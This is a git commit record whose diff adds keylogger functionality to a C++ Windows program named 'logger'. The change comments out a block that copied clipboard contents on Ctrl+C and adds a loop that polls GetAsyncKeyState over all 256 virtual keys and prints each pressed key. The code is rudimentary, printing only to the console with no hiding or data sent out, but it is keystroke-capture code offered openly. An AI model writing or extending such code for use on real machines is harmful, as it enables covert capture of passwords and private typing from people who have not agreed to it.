60952b0c0bf120e3651eaa628fde2c463d6d2b7d
William Prioriello <williamap@gmail.com>
2017-01-02 02:35:40 -0500

    functionality for keylogger implemented

--- logger/logger/main.cpp
+++ logger/logger/main.cpp
@@ -10,6 +10,7 @@ int main()
 {
 	micro1337::KeyListener* log = micro1337::KeyListener::instance();
 	while (1) {
+		/*
 		if (log->isCPressed() && log->isCtrlPressed()) {	
 			auto activeWindow = GetForegroundWindow();
 			OpenClipboard(activeWindow);
@@ -26,6 +27,28 @@ int main()
 			CloseClipboard();
 		}
 		Sleep(5);
+		*/
+		for (auto i = 0; i <= 255; i++) {
+			const SHORT key_state = GetAsyncKeyState(i);
+			const SHORT MSB = key_state >> 15;
+			const SHORT LSB = key_state << 15;
+			
+			if (MSB != 0) { // get the most significant bit
+				//MSB is not zero (-1 usually). Key is pressed	
+				if (LSB != 0) // bad to rely on this
+				{
+
+					cout << (char)i;
+			}
+				
+			}
+			else if (MSB == 0) {
+				//cout << i;
+				//cout << "Key state: not pressed" << key_state << '\n';
+			}
+			
+		}
+		
 	}
 	getchar();
     return 0;
